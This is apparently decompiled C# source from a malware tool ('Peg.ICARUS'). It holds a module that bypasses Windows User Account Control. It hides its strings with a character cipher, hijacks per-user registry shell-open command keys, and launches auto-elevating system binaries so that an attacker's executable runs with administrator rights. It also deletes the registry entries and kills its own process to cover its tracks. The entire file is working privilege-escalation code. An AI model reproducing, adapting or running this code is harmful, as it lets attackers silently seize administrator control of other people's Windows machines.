using System;
using System.Diagnostics;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.Win32;

namespace Peg.ICARUS
{
	public class Sucks
	{
		public Sucks(byte[] encodedCommand)
		{
			string @string = Encoding.UTF8.GetString(encodedCommand);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(AlphaAndOmega.BCutEncrypt("Yel~}kxoVIfkyyoyV") ?? "", writable: true);
			registryKey.CreateSubKey(AlphaAndOmega.BCutEncrypt("orolcfoVYboffVEzodVieggkdn") ?? "");
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(AlphaAndOmega.BCutEncrypt("Yel~}kxoVIfkyyoyVorolcfoVYboffVEzodVieggkdn") ?? "", writable: true);
			registryKey2.SetValue("", @string);
			registryKey2.Close();
			Process process = new Process();
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.FileName = AlphaAndOmega.BCutEncrypt("I0VV}cdne}yVVysy~og98VVyf\u007fc$oro");
			process.StartInfo.Verb = AlphaAndOmega.BCutEncrypt("x\u007fdky");
			process.Start();
			Thread.Sleep(10000);
			registryKey.DeleteSubKeyTree(AlphaAndOmega.BCutEncrypt("orolcfo"));
		}

		public static void tosuck()
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				Value(AlphaAndOmega.BCutEncrypt("Ifkyyoy"));
				Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmy"));
				Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboff"));
				Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezod"));
				RegistryKey registryKey = Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezodVVieggkdn"));
				registryKey.SetValue("", Application.ExecutablePath, RegistryValueKind.String);
				registryKey.SetValue(AlphaAndOmega.BCutEncrypt("Nofomk~oOroi\u007f~o"), 0, RegistryValueKind.DWord);
				registryKey.Close();
				try
				{
					Process.Start(new ProcessStartInfo
					{
						CreateNoWindow = true,
						UseShellExecute = false,
						FileName = Strings.StrReverse("exe.dmc"),
						Arguments = AlphaAndOmega.BCutEncrypt("%i*y~kx~*iegz\u007f~oxnolk\u007ff~y$oro")
					});
				}
				catch (Exception)
				{
				}
				Process.GetCurrentProcess().Kill();
			}
			else
			{
				Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezodVVieggkdn")).SetValue("", "", RegistryValueKind.String);
			}
			Thread.Sleep(10000);
			string location = Assembly.GetExecutingAssembly().Location;
			Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezodVVieggkdn")).DeleteSubKeyTree(location);
		}

		public static void suck(string filename)
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				Value(AlphaAndOmega.BCutEncrypt("Ifkyyoy"));
				Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmy"));
				Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboff"));
				Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezod"));
				RegistryKey registryKey = Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezodVVieggkdn"));
				registryKey.SetValue("", filename, RegistryValueKind.String);
				registryKey.SetValue(AlphaAndOmega.BCutEncrypt("Nofomk~oOroi\u007f~o"), 0, RegistryValueKind.DWord);
				registryKey.Close();
				try
				{
					Process.Start(new ProcessStartInfo
					{
						CreateNoWindow = true,
						UseShellExecute = false,
						FileName = Strings.StrReverse("exe.dmc"),
						Arguments = AlphaAndOmega.BCutEncrypt("%i*y~kx~*iegz\u007f~oxnolk\u007ff~y$oro")
					});
				}
				catch (Exception)
				{
				}
				Process.GetCurrentProcess().Kill();
			}
			else
			{
				Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezodVVieggkdn")).SetValue("", "", RegistryValueKind.String);
			}
			Thread.Sleep(10000);
			string location = Assembly.GetExecutingAssembly().Location;
			Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezodVVieggkdn")).DeleteSubKeyTree(location);
		}

		public static RegistryKey Value(string string_0)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(AlphaAndOmega.BCutEncrypt("Yel~}kxoVV") + string_0, writable: true);
			if (!checksubkey(registryKey))
			{
				registryKey = Registry.CurrentUser.CreateSubKey(AlphaAndOmega.BCutEncrypt("Yel~}kxoVV") + string_0);
			}
			return registryKey;
		}

		public static bool checksubkey(RegistryKey registryKey_0)
		{
			return registryKey_0 != null;
		}
	}
}
